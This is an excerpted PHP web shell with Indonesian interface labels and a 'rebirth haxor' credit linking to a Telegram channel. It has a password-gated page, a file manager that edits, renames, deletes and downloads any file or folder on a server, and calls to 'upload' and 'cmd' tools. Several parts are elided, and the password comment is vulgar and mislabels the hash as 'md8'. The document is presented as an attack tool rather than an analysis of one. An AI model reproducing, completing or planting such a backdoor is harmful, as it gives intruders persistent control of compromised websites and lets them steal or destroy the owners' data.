...
$password = "4bb0153a92ec713138711a7b93009b2c"; # md8: kontolhaxor
...
<head>
<title>.:ACCES:.</title>
<link rel="icon" type="image/x-icon" href="https://i.ibb.co/CH27TnP/cf8349d8c63ad62c928ad41555cac5c5.jpg"/revision/latest?cb=20120927033254">
<center>
<img src="https://i.ibb.co/CH27TnP/cf8349d8c63ad62c928ad41555cac5c5.jpg"  width="400" height="400">
<style type="text/css">
html {
	margin: 20px auto;
	background: black;
...
function files_and_folder() {
	...
	foreach($dir as $folder) {
		...
		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>filebaru</a> | <a href='?act=newfolder&dir=".path()."'>folderbaru</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>ubahnama</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>hapus</a>";
	...
	foreach($dir as $files) {
		...
		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>ubahnama</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>hapus</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>unduh</a></td>";
		print "</tr>";
	}
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='https://t.me/rusakutub/' target='_blank'>".color(1, 2, "rebirth haxor")."</a></center>";
}
function action() {
	tools("upload");
	tools("cmd");
